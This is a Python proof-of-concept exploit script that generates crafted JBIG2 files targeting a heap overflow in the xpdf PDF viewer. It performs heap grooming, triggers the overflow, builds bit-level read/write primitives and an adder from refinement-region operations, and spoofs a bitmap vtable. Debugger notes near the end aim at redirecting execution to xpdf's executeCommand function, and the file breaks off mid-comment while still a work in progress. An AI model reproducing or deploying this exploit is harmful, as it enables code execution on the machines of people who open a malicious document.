#!/usr/bin/env python3

import struct, os

class segmentHeader:
	def __init__(self, seg_num, seg_flags, ref_flags, page, seg_length):
		self.seg_num = seg_num
		self.seg_flags = seg_flags
		self.ref_flags = ref_flags
		self.page = page
		self.seg_length = seg_length

	def raw(self):
		return  struct.pack(">I", self.seg_num) + \
				struct.pack("B", self.seg_flags) + \
				struct.pack("B", self.ref_flags) + \
				struct.pack("B", self.page) + \
				struct.pack(">I", self.seg_length)


class segmentHeaderWithRefSegs:
	def __init__(self, seg_num, seg_flags, ref_flags, ref_segs, page, seg_length):
		self.seg_num = seg_num
		self.seg_flags = seg_flags
		self.ref_flags = ref_flags
		self.ref_segs = ref_segs
		self.page = page
		self.seg_length = seg_length

	def raw(self):
		return  struct.pack(">I", self.seg_num) + \
				struct.pack("B", self.seg_flags) + \
				struct.pack("B", self.ref_flags) + \
				self.ref_segs + \
				struct.pack("B", self.page) + \
				struct.pack(">I", self.seg_length)


class segmentHeaderWithRefSegsLarge:
	def __init__(self, seg_num, seg_flags, ref_flags, ref_segs, page, seg_length):
		self.seg_num = seg_num
		self.seg_flags = seg_flags
		self.ref_flags = ref_flags
		self.ref_segs = ref_segs
		self.page = page
		self.seg_length = seg_length

	def raw(self):
		return  struct.pack(">I", self.seg_num) + \
				struct.pack("B", self.seg_flags) + \
				struct.pack(">I", self.ref_flags) + \
				self.ref_segs + \
				struct.pack("B", self.page) + \
				struct.pack(">I", self.seg_length)


class symbolDictionarySegment:
	def __init__(self, flags, sd_atx, sd_aty, num_ex_syms, num_new_syms, decoder_bytes):
		self.flags = flags
		self.sd_atx = sd_atx
		self.sd_aty = sd_aty
		self.num_ex_syms = num_ex_syms
		self.num_new_syms = num_new_syms
		self.decoder_bytes = decoder_bytes

	def raw(self):
		return  struct.pack(">H", self.flags) + \
				struct.pack("B", self.sd_atx[0]) + \
				struct.pack("B", self.sd_aty[0]) + \
				struct.pack("B", self.sd_atx[1]) + \
				struct.pack("B", self.sd_aty[1]) + \
				struct.pack("B", self.sd_atx[2]) + \
				struct.pack("B", self.sd_aty[2]) + \
				struct.pack("B", self.sd_atx[3]) + \
				struct.pack("B", self.sd_aty[3]) + \
				struct.pack(">I", self.num_ex_syms) + \
				struct.pack(">I", self.num_new_syms) + \
				self.decoder_bytes


class refAggSymbolDictionarySegment:
	def __init__(self, flags, sd_atx, sd_aty, sdr_atx, sdr_aty, num_ex_syms, num_new_syms, decoder_bytes):
		self.flags = flags
		self.sd_atx = sd_atx
		self.sd_aty = sd_aty
		self.sdr_atx = sdr_atx
		self.sdr_aty = sdr_aty
		self.num_ex_syms = num_ex_syms
		self.num_new_syms = num_new_syms
		self.decoder_bytes = decoder_bytes

	def raw(self):
		return  struct.pack(">H", self.flags) + \
				struct.pack("B", self.sd_atx[0]) + \
				struct.pack("B", self.sd_aty[0]) + \
				struct.pack("B", self.sd_atx[1]) + \
				struct.pack("B", self.sd_aty[1]) + \
				struct.pack("B", self.sd_atx[2]) + \
				struct.pack("B", self.sd_aty[2]) + \
				struct.pack("B", self.sd_atx[3]) + \
				struct.pack("B", self.sd_aty[3]) + \
				struct.pack("B", self.sdr_atx[0]) + \
				struct.pack("B", self.sdr_aty[0]) + \
				struct.pack("B", self.sdr_atx[1]) + \
				struct.pack("B", self.sdr_aty[1]) + \
				struct.pack(">I", self.num_ex_syms) + \
				struct.pack(">I", self.num_new_syms) + \
				self.decoder_bytes




class pageInfoSegment:
	def __init__(self, page_w, page_h, x_res, y_res, flags, striping):
		self.page_w = page_w
		self.page_h = page_h
		self.x_res = x_res
		self.y_res = y_res
		self.flags = flags
		self.striping = striping

	def raw(self):
		return  struct.pack(">I", self.page_w) + \
				struct.pack(">I", self.page_h) + \
				struct.pack(">I", self.x_res) + \
				struct.pack(">I", self.y_res) + \
				struct.pack("B", self.flags) + \
				struct.pack(">H", self.striping)


class textRegionSegment:
	def __init__(self, w, h, x, y, seg_info_flags, flags, num_instances, decoder_bytes):
		self.w = w
		self.h = h
		self.x = x
		self.y = y
		self.seg_info_flags = seg_info_flags
		self.flags = flags
		self.num_instances = num_instances
		self.decoder_bytes = decoder_bytes

	def raw(self):
		return  struct.pack(">I", self.w) + \
				struct.pack(">I", self.h) + \
				struct.pack(">I", self.x) + \
				struct.pack(">I", self.y) + \
				struct.pack("B", self.seg_info_flags) + \
				struct.pack(">H", self.flags) + \
				struct.pack(">I", self.num_instances) + \
				self.decoder_bytes


class genericRefinementRegionSegment:
	def __init__(self, w, h, x, y, seg_info_flags, flags, sd_atx, sd_aty, decoder_bytes):
		self.w = w
		self.h = h
		self.x = x
		self.y = y
		self.seg_info_flags = seg_info_flags
		self.flags = flags
		self.sd_atx = sd_atx
		self.sd_aty = sd_aty
		self.decoder_bytes = decoder_bytes
	
	def raw(self):
		if self.flags & 1 == 1:
			# templ on, atx/aty not read
			return  struct.pack(">I", self.w) + \
				struct.pack(">I", self.h) + \
				struct.pack(">I", self.x) + \
				struct.pack(">I", self.y) + \
				struct.pack("B", self.seg_info_flags) + \
				struct.pack("B", self.flags) + \
				self.decoder_bytes
		else:
			return  struct.pack(">I", self.w) + \
					struct.pack(">I", self.h) + \
					struct.pack(">I", self.x) + \
					struct.pack(">I", self.y) + \
					struct.pack("B", self.seg_info_flags) + \
					struct.pack("B", self.flags) + \
					struct.pack("B", self.sd_atx[0]) + \
					struct.pack("B", self.sd_aty[0]) + \
					struct.pack("B", self.sd_atx[1]) + \
					struct.pack("B", self.sd_aty[1]) + \
					self.decoder_bytes


def or_bytes_at_offset(f, bytez, offset):
	bits = 0
	for byte in bytez:
			for bit in format(byte, "08b"):
				# encode 1 bit
				data_bytes = b"\xff\x7f\xff\xac"
				if bit == "0":
					# encode 0 bit
					data_bytes = b"\x7f\xff\xac"	
				# 																		w, h, x, y, seg_info_flags, flags, sd_atx, sd_aty, decoder_bytes
				grrs = genericRefinementRegionSegment(0x1, 0x1, (offset << 3) + bits, 0, OR, 0, [0,0], [0,0], data_bytes)
				grrs_sh = segmentHeader(0xffffffff, 0x2A, 0, 1, len(grrs.raw()))
				f.write(grrs_sh.raw() + grrs.raw())
				bits += 1
	

def and_bytes_at_offset(f, bytez, offset):
	bits = 0
	for byte in bytez:
			for bit in format(byte, "08b"):
				# encode 1 bit
				data_bytes = b"\xff\x7f\xff\xac"
				if bit == "0":
					# encode 0 bit
					data_bytes = b"\x7f\xff\xac"

				grrs = genericRefinementRegionSegment(0x1, 0x1, (offset << 3) + bits, 0, AND, 0, [0,0], [0,0], data_bytes)
				grrs_sh = segmentHeader(0xffffffff, 0x2A, 0, 1, len(grrs.raw()))
				f.write(grrs_sh.raw() + grrs.raw())
				bits += 1
	

def replace_bytes_at_offset(f, bytez, offset):
	bits = 0
	for byte in bytez:
			for bit in format(byte, "08b"):
				# encode 1 bit
				data_bytes = b"\xff\x7f\xff\xac"
				if bit == "0":
					# encode 0 bit
					data_bytes = b"\x7f\xff\xac"

				grrs = genericRefinementRegionSegment(0x1, 0x1, (offset << 3) + bits, 0, REPLACE, 0, [0,0], [0,0], data_bytes)
				grrs_sh = segmentHeader(0xffffffff, 0x2A, 0, 1, len(grrs.raw()))
				f.write(grrs_sh.raw() + grrs.raw())
				bits += 1

# offsets
data_buffer_to_segments = 0x3B0
data_buffer_to_bitmap = 0x4b0
data_buffer_to_known_good_bitmap = 0x4d0
data_buffer_to_bitmap_w = data_buffer_to_bitmap + 0x8 + 0x4
data_buffer_to_bitmap_h = data_buffer_to_bitmap + 0x8 + 0x8
data_buffer_to_bitmap_line = data_buffer_to_bitmap + 0x8 + 0xc
data_buffer_to_bitmap_data = data_buffer_to_bitmap + 0x8 + 0x10
data_buffer_to_known_good_sds = 0x6c0

spoofed_bitmap_segnum = 0x8
spoofed_bitmap_w = 0xc
spoofed_bitmap_h = 0x10
spoofed_bitmap_line = 0x14
spoofed_bitmap_data = 0x18

spoofed_vtable = 0x68

spoofed_sds = 0x48
spoofed_sds_segnum = spoofed_sds + 0x8
spoofed_sds_size = spoofed_sds + 0xc
spoofed_sds_bitmaps = spoofed_sds + 0x10

spoofed_sds_bitmaps_pointer = 0x60

flags = 0x20
rax = 0x28
rbx = 0x30
rcx = 0x38
rdx = 0x40

rax_high = 0x2c
rbx_high = 0x34
rcx_high = 0x3c
rdx_high = 0x44

eax = 0x28
ebx = 0x30
ecx = 0x38
edx = 0x40


# bitwise operations 
OR = 0
AND = 1
XOR = 2
XNOR = 3
REPLACE = 4

# segment list operations in readGenericReginementSeg
COMBINE = 0x2a
STORE = 0x28

# bit to write when discarding, don't care about its value
garbage_bit = (0x27  << 3) + 7
sum_half_adder_bit = (0x20  << 3)
carry_bit = (0x20  << 3)  + 1
carry_half_adder_bit = (0x20  << 3) + 2

"""
Fake JBIG2Bitmap: red
EFLAGS: blue
RAX: purple
RBX: green
RCX: pink
RDX: orange

registers

General registers
EAX EBX ECX EDX

Segment registers
CS DS ES FS GS SS

Index and pointers
ESI EDI EBP EIP ESP

Indicator
EFLAGS

EFLAGS:
Bit   Label    Desciption
---------------------------
0      CF      Carry flag
2      PF      Parity flag
4      AF      Auxiliary carry flag
6      ZF      Zero flag
7      SF      Sign flag
8      TF      Trap flag
9      IF      Interrupt enable flag
10     DF      Direction flag
11     OF      Overflow flag
12-13  IOPL    I/O Priviledge level
14     NT      Nested task flag
16     RF      Resume flag
17     VM      Virtual 8086 mode flag
18     AC      Alignment check flag (486+)
19     VIF     Virutal interrupt flag
20     VIP     Virtual interrupt pending flag
21     ID      ID flag
"""

debug_sh = segmentHeader(0xffffffff, 0x34, 0, 1, 0)
final_debug_sh = segmentHeader(0xffffffff, 0x3E, 0, 1, 0)
toggle_debug_sh = segmentHeader(0xffffffff, 0x32, 0, 1, 0)



def unbound_page(f):
	# needed to appease some sanity check, swap out the page anyway later
	pis = pageInfoSegment(1, 1, 0, 0, 0, 0)
	pis_sh = segmentHeader(0xffffffff, 0x30, 0, 1, len(pis.raw()))
	f.write(pis_sh.raw() + pis.raw())

	# dictionary seg
	mal_sds = symbolDictionarySegment(
		0, 
		[0x03,0xFD,0x02,0xFE], 
		[0xFF,0xFF,0xFE,0xFE], 
		0xFFFF, 
		0xFFFF,
		b"\x94\x4f\x06\x7b\xff\x7f\xff\x7f\xff\x7f\xff\x7d\xd3\x26\xa8\x9d\x6c\xb0\xee\x7f\xff\xac"
	)
	mal_sds_sh = segmentHeader(1, 0, 1, 0, len(mal_sds.raw()))
	f.write(mal_sds_sh.raw() + mal_sds.raw())

	# force 1Q mallocs to eat up all the free space
	for i in range(1, 0x10000):
		pis = pageInfoSegment(0x71, 1, 0, 0, 0, 0)
		pis_sh = segmentHeader(0xffffffff, 0x30, 0, 1, len(pis.raw()))
		f.write(pis_sh.raw() + pis.raw())

	# set up segments Glist for resizing (reallocation)
	for i in range(0, 0xF):
		sds = symbolDictionarySegment(0, [0x03,0xFD,0x02,0xFE], [0xFF,0xFF,0xFE,0xFE], 1, 1, b"\x93\xFC\x7F\xFF\xAC")
		sds_sh = segmentHeader(2, 0, 1, 0, len(sds.raw()))
		f.write(sds_sh.raw() + sds.raw())

	# allocate 0x80, 0x80, and 0x40 in that order
	sds = symbolDictionarySegment(0, 
		[0x03,0xFD,0x02,0xFE], 
		[0xFF,0xFF,0xFE,0xFE], 
		3, 
		3, 
		b"\x13\xb0\xb7\xcf\x36\xb1\x68\xbf\xff\xac")
	sds_sh = segmentHeader(3, 0, 1, 0, len(sds.raw()))
	f.write(sds_sh.raw() + sds.raw())
	
	# consume some freed blocks
	for i in range(0, 1):
		pis = pageInfoSegment(0x71, 1, 0, 0, 0, 0)
		pis_sh = segmentHeader(0xffffffff, 0x30, 0, 1, len(pis.raw()))
		f.write(pis_sh.raw() + pis.raw())

	# allocate page that will be exploited
	# 0x3F1 results in a malloc of 0x80 for the buffer, should reclaim from cache
	pis = pageInfoSegment(0x3F1, 1, 0, 0, 0, 0)
	pis_sh = segmentHeader(4, 0x30, 0, 1, len(pis.raw()))
	f.write(pis_sh.raw() + pis.raw())

	# trigger the vuln and create a bitmap directly after triggering, will steal vtable for arbitrary read
	trs = textRegionSegment(1, 1, 0, 0, 0, 0, 1, b"\xA9\x43\xFF\xAC")
	ref_seg_bytes = (b"\xff" * 0x2D) + (b"\x02" * 0xFFD2) + (0x10000 * b"\x01") + (b"\x02" * 1) + (b"\x02" * 0x2)
	pad = ((len(ref_seg_bytes) + 9) >> 3) * b"\x00"
	trs_sh = segmentHeaderWithRefSegsLarge(5, 
		0x4, 
		0xE0000000 + len(ref_seg_bytes), 
		pad + ref_seg_bytes,
		1, 
		len(trs.raw())
	)
	f.write(trs_sh.raw() + trs.raw())

	"""
	# testing, hope is to allocate an sds predictably for further faking
	# store segment of size 1 to increment syms buffer size granularly
	sds = symbolDictionarySegment(0, [0x03,0xFD,0x02,0xFE], [0xFF,0xFF,0xFE,0xFE], 1, 1, b"\x93\xFC\x7F\xFF\xAC")
	sds_sh = segmentHeader(0x9999, 0, 1, 0, len(sds.raw()))
	f.write(sds_sh.raw() + sds.raw())
	"""
	#f.write(debug_sh.raw())
	# end testing

	# fail a sanity check but set pageW and pageH to large values so subsequent reads will work 
	pis = pageInfoSegment(0xffffffff, 0xfffffffe, 0, 0, 0, 0)
	pis_sh = segmentHeader(0xffffffff, 0x30, 0, 1, len(pis.raw()))	
	f.write(pis_sh.raw() + pis.raw())

	# overwrite pageBitmaps values to fully unbound operations
	# line is overwritten with -1 for now
	or_bytes_at_offset(f, struct.pack("<I", 0x7FFFFFFF), data_buffer_to_bitmap_w)
	or_bytes_at_offset(f, struct.pack("<I", 0x7FFFFFFF), data_buffer_to_bitmap_h)
	or_bytes_at_offset(f, struct.pack("<I", 0xFFFFFFFF), data_buffer_to_bitmap_line)


def read_from_offset_to_offset(f, num_bits, read_byte_offset, read_bit_offset, write_byte_offset, write_bit_offset):
	for i in range(num_bits):
		grrs = genericRefinementRegionSegment(0x1, 0x1, (read_byte_offset << 3) + read_bit_offset + i, 0, 0, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeader(0xBADDAD, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())
		# was or, if that breaks anything
		grrs = genericRefinementRegionSegment(0x1, 0x1, (write_byte_offset << 3) + write_bit_offset + i, 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xBADDAD), 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())


def op_from_offset_to_offset(f, num_bits, read_bit_offset, write_bit_offset, op):
	for i in range(num_bits):
		grrs = genericRefinementRegionSegment(0x1, 0x1, read_bit_offset + i, 0, 0, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeader(0xBADDAD, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())
		grrs = genericRefinementRegionSegment(0x1, 0x1, write_bit_offset + i, 0, op, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xBADDAD), 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())


def discard_segment(f, seg_num):
	grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
	grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", seg_num), 1, len(grrs.raw()))
	f.write(grrs_sh.raw() + grrs.raw())


def flush_overflow_segments(f):
		for i in range(0, 0x11):
		# swap in 0x11 placeholders
			grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], b"\x7f\xff\xac")
			grrs_sh = segmentHeader(0xc0ffee, STORE, 0, 1, len(grrs.raw()))
			f.write(grrs_sh.raw() + grrs.raw())
		
			grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, AND, 2, [0,0], [0,0], b"\x7f\xff\xac")
			grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0x0), 1, len(grrs.raw()))
			f.write(grrs_sh.raw() + grrs.raw())

		for i in range(0x11, 0x1f):
			# fill the rest of the list with placeholders
			grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], b"\x7f\xff\xac")
			grrs_sh = segmentHeader(0xc0ffee, STORE, 0, 1, len(grrs.raw()))
			f.write(grrs_sh.raw() + grrs.raw())
	# list is now 0x1f long, one segment left to do offset reads


def read_bit_from_calculated_offset_to_offset(f, write_byte_offset, write_bit_offset):
	# list is now set up for rotating reads. 0x1f segments switched in
	# last pointer overwritten by every segment read, last bit is 0 because
	# of byte alignment, so not all 32 bits are needed. upper 32 bits don't
	# have to be changed

	for i in range(0, 0x1f):
		# consume placeholders, store bits of buffer address
		grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, REPLACE, 2, [0,0], [0,0], b"\x7f\xff\xac")
		grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xc0ffee), 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())

		grrs = genericRefinementRegionSegment(0x1, 0x1, ((data_buffer_to_bitmap_data + 3 - (i // 8)) << 3) + (i % 8), 0, 0, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeader(0xcafe + i, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())

	# append segment (brings list up to 0x20), will overwrite this pointer in the segment list
	grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], b"\xff\x7f\xff\xac")
	grrs_sh = segmentHeader(0xc0ffee, STORE, 0, 1, len(grrs.raw()))
	f.write(grrs_sh.raw() + grrs.raw())

	for i in range(0, 0x1f):
		# write buffer address into list
		grrs = genericRefinementRegionSegment(0x1, 0x1, (((data_buffer_to_segments + (0x8 * (0x1f - i))) + 0x3 - (i // 8) ) << 3) + (i % 8), 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		#grrs = genericRefinementRegionSegment(0x1, 0x1, ((data_buffer_to_segments + (0x8 * (0x1f - i))) << 3) + i, 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xcafe + i), 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())

		# restore a placeholder
		grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeader(0xc0ffee, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())

	# trigger the write with the spoofed bitmap
	grrs = genericRefinementRegionSegment(0x1, 0x1, (write_byte_offset << 3) + write_bit_offset, 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
	grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xdeadbeef), 1, len(grrs.raw()))
	f.write(grrs_sh.raw() + grrs.raw())


def read_from_calculated_offset_to_offset(f, num_bits, write_byte_offset, write_bit_offset):
	for i in range(0, num_bits):
		read_bit_from_calculated_offset_to_offset(f, write_byte_offset, i + write_bit_offset)


def zero_page(f):
		# zero page
	for i in range(0, 0x80, 0x4):
		replace_bytes_at_offset(f, struct.pack("<I", 0), i)

def zero_8_bytes(f, offset):
	replace_bytes_at_offset(f, struct.pack("<I", 0), offset)
	replace_bytes_at_offset(f, struct.pack("<I", 0), offset + 4)



def add_64(f, r1, r2):
	zero_8_bytes(f, flags)
	for i in range(0, 0x40):
		#replace_bytes_at_offset(f, struct.pack("<I", i + 1), edx)
		# first half adder 
		"""
		b1 XOR b2 = carry
		b1 AND b2 = sum
		"""
		#((data_buffer_to_bitmap_data + 3 - (i // 8)) << 3) + (i % 8)
		op_from_offset_to_offset(f, 1, ((r1 + i // 8) << 3) + (7 - (i % 8)), sum_half_adder_bit, REPLACE)
		op_from_offset_to_offset(f, 1, ((r2 + i // 8) << 3) + (7 - (i % 8)), sum_half_adder_bit, XOR)

		op_from_offset_to_offset(f, 1, ((r1 + i // 8) << 3) + (7 - (i % 8)), carry_half_adder_bit , REPLACE)
		op_from_offset_to_offset(f, 1, ((r2 + i // 8) << 3) + (7 - (i % 8)), carry_half_adder_bit, AND)

		# second half adder
		"""
		sum XOR carry_in = sum
		b1 AND b2 = carry
		"""
		op_from_offset_to_offset(f, 1, sum_half_adder_bit, ((r1 + i // 8) << 3) + (7 - (i % 8)), REPLACE)
		op_from_offset_to_offset(f, 1, carry_bit, ((r1 + i // 8) << 3) + (7 - (i % 8)), XOR)

		#op_from_offset_to_offset(f, num_bits, carry_half_adder_bit, carry_half_adder_bit , REPLACE)
		op_from_offset_to_offset(f, 1, sum_half_adder_bit, carry_bit, AND)
		# get carry out for next op
		op_from_offset_to_offset(f, 1, carry_half_adder_bit, carry_bit, OR)


	

with open("poc.sym", "wb") as f:
	# store segment of size 1 to increment syms buffer size granularly
	sds = symbolDictionarySegment(0, [0x03,0xFD,0x02,0xFE], [0xFF,0xFF,0xFE,0xFE], 1, 1, b"\x93\xFC\x7F\xFF\xAC")
	sds_sh = segmentHeader(0xff, 0, 1, 0, len(sds.raw()))
	f.write(sds_sh.raw() + sds.raw())


with open("poc.0000", "wb") as f:
	unbound_page(f)

	# used 1 through 5 and 0xff, 0 is a placeholder for "anonymous" bitmaps, can't use it
	# because these bitmaps need to be cleared from segments after the overflow
	seg_num_counter = 6
	
	# 0xbaddad for read
	# 0xc0ffee for list placeholders
	# 0xdeadbeef for calculated read (spoofed seg has segNum 0xdeadbeef)
	#zero_page(f)

	# read good bitmap struct vtable to start of data buffer for spoofed reads
	read_from_offset_to_offset(f, 8 * 0x8, data_buffer_to_known_good_bitmap, 0, 0, 0)


	# overwrite bitmap values
	replace_bytes_at_offset(f, struct.pack("<I", 0xDEADBEEF), spoofed_bitmap_segnum)
		#replace_bytes_at_offset(f, struct.pack("<I", 0x1),  spoofed_bitmap_w)
		#replace_bytes_at_offset(f, struct.pack("<I", 0x1), spoofed_bitmap_h)
		#replace_bytes_at_offset(f, struct.pack("<I", 0x1), spoofed_bitmap_line)
	#f.write(debug_sh.raw())
	
	# discard text segment that triggered overflow
	# after this, only bitmaps with 0x00 are included
	discard_segment(f, 5)
	
	# set up list
	
	flush_overflow_segments(f)
		
	# read 8 bits from calculated address into rdx
	# reaches here, but a few issues.
	"""
	First, list isn't staying static size, constantly resizing. Check logic on list flow
	new expanded list data @ 0x7fb92bc085e0 with size: 0x00000200
	new expanded list data @ 0x7fb92bc085e0 with size: 0x00000200
	new expanded list data @ 0x7fb92bc085e0 with size: 0x00000200
	new expanded list data @ 0x7fb92bc085e0 with size: 0x00000200
	new expanded list data @ 0x7fb92bc085e0 with size: 0x00000200
	new expanded list data @ 0x7fb92bc085e0 with size: 0x00000200
	new expanded list data @ 0x7fb92bc085e0 with size: 0x00000200

	dump segments wtih debug header to figure out
	second, some flag is set?
	=============== page buffer ===============
	E8 75 FE 03 01 00 00 00  EF BE AD DE 01 00 00 00
	01 00 00 00 01 00 00 00  41 41 41 41 41 41 41 41
	00 00 00 00 00 00 00 01  00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00

	^^ this is garbage bit for discarding things
	garbage_bit
	"""
	# populate RCX to test read åprimitive
	# 0x55: 01010101
	# 0xAA: 10101010
	# write arbitrary value to test read into rdx
	
	#replace_bytes_at_offset(f, struct.pack("<I", 0x55555555), rdx)
	#replace_bytes_at_offset(f, struct.pack("<I", 0x55555555), rdx_high)
	

	replace_bytes_at_offset(f, struct.pack("<I", 0xAAAAAAAA), rdx)
	replace_bytes_at_offset(f, struct.pack("<I", 0xAAAAAAAA), rdx_high)
	
	#replace_bytes_at_offset(f, struct.pack("<I", 0xFFFFFFFF), rdx)
	#replace_bytes_at_offset(f, struct.pack("<I", 0xFFFFFFFF), rdx_high)
	

	# pointer to bitmap loaded into RAX
	read_from_offset_to_offset(f, 8 * 0x8, data_buffer_to_bitmap_data, 0, rax, 0)

	# data buffer pointer + 0x40 -> rdx
	# set to 0x41 to test reading negative offsets
	replace_bytes_at_offset(f, struct.pack("<I", 0x41), rbx)
	replace_bytes_at_offset(f, struct.pack("<I", 0), rbx_high)

	# spoofed read address now points to fully controllable rdx
	add_64(f, rax, rbx)

	# mov rax to read address in spoofed bitmap
	read_from_offset_to_offset(f, 8 * 0x8, rax, 0, spoofed_bitmap_data, 0)

	#read_from_calculated_offset_to_offset(f, 1, rdx, 0)
	
	#WIP read from bits
	#def read_bit_from_calculated_offset_to_offset(f, write_byte_offset, write_bit_offset):
	# list is now set up for rotating reads. 0x1f segments switched in
	# last pointer overwritten by every segment read, last bit is 0 because
	# of byte alignment, so not all 32 bits are needed. upper 32 bits don't
	# have to be changed

	for bi in range(1, 0x2):
		for i in range(0, 0x1f):
			# consume placeholders, store bits of buffer address
			grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, REPLACE, 2, [0,0], [0,0], b"\x7f\xff\xac")
			grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xc0ffee), 1, len(grrs.raw()))
			f.write(grrs_sh.raw() + grrs.raw())

			grrs = genericRefinementRegionSegment(0x1, 0x1, ((data_buffer_to_bitmap_data + 3 - (i // 8)) << 3) + (i % 8), 0, 0, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
			grrs_sh = segmentHeader(0xcafe + i, STORE, 0, 1, len(grrs.raw()))
			f.write(grrs_sh.raw() + grrs.raw())

		# append segment (brings list up to 0x20), will overwrite this pointer in the segment list
		grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeader(0xc0ffee, STORE, 0, 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())

		for i in range(0, 0x1f):
			# write buffer address into list
			grrs = genericRefinementRegionSegment(0x1, 0x1, (((data_buffer_to_segments + (0x8 * (0x1f - i))) + 0x3 - (i // 8) ) << 3) + (i % 8), 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
			#grrs = genericRefinementRegionSegment(0x1, 0x1, ((data_buffer_to_segments + (0x8 * (0x1f - i))) << 3) + i, 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
			grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xcafe + i), 1, len(grrs.raw()))
			f.write(grrs_sh.raw() + grrs.raw())

			# restore a placeholder
			grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, 0, 0, [0,0], [0,0], b"\xff\x7f\xff\xac")
			grrs_sh = segmentHeader(0xc0ffee, STORE, 0, 1, len(grrs.raw()))
			f.write(grrs_sh.raw() + grrs.raw())

		# trigger the write with the spoofed bitmap
		replace_bytes_at_offset(f, struct.pack("<I", 0x1),  spoofed_bitmap_w)
		replace_bytes_at_offset(f, struct.pack("<I", 0x1), spoofed_bitmap_h)
		replace_bytes_at_offset(f, struct.pack("<I", 0x1), spoofed_bitmap_line)
		f.write(toggle_debug_sh.raw())
		# grrs = genericRefinementRegionSegment(0x1, 0x1, (write_byte_offset << 3) + write_bit_offset + i, 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		# class genericRefinementRegionSegment(self, w, h, x, y, seg_info_flags, flags, sd_atx, sd_aty, decoder_bytes):
		print((rcx << 3) + bi)
		grrs = genericRefinementRegionSegment(0x1, 0x1, (rcx << 3) + bi, 0, REPLACE, 2, [0,0], [0,0], b"\xff\x7f\xff\xac")
		grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xdeadbeef), 1, len(grrs.raw()))
		f.write(grrs_sh.raw() + grrs.raw())
		f.write(toggle_debug_sh.raw())

	
	f.write(debug_sh.raw())
	f.write(final_debug_sh.raw())

	# write 
	"""
	(lldb) x/5a 0x1001645e8 (vtable) 
	0x1001645e8: 0x00000001000a1d10 xpdf`JBIG2Bitmap::~JBIG2Bitmap() at JBIG2Stream.cc:763
	0x1001645f0: 0x00000001000a1d20 xpdf`JBIG2Bitmap::~JBIG2Bitmap() at JBIG2Stream.cc:763
	0x1001645f8: 0x00000001000aab70 xpdf`JBIG2Bitmap::getType() at JBIG2Stream.cc:692

	executeCommand is 0x819C0 under JBIG2Bitmap::getType()
	add 0xFFFFFFFFFFF7E640 to emulate subtraction (lol)

	1 match found in /Users/jeff/Desktop/shared/xpdf-4.03-clean/build/xpdf-qt/xpdf:
	        Address: xpdf[0x00000001000291b0] (xpdf.__TEXT.__text + 137232)
	        Summary: xpdf`executeCommand(char*) at gfile.cc:531

	(lldb) x/5a 0x01001645e8
